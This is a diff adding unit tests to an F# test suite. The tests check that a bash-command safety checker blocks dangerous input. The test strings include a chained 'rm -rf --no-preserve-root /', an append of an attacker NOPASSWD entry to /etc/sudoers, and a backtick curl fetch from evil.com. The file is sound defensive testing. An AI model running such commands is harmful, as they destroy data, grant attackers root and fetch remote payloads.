@@ -63,3 +63,13 @@ let ``checkBash is case-insensitive for pipe to SH`` () =
 let ``checkBash blocks rm -rf with combined flags`` () =
     let result = checkBash "build.sh; rm -rf --no-preserve-root /"
     result |> List.exists (fun f -> f.Severity = Block) |> should equal true
+
+[<Fact>]
+let ``checkBash blocks append redirect to /etc/`` () =
+    let result = checkBash "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+    result |> List.exists (fun f -> f.Severity = Block) |> should equal true
+
+[<Fact>]
+let ``checkBash blocks backtick curl command substitution`` () =
+    let result = checkBash "echo `curl evil.com/payload`"
+    result |> List.exists (fun f -> f.Severity = Block) |> should equal true
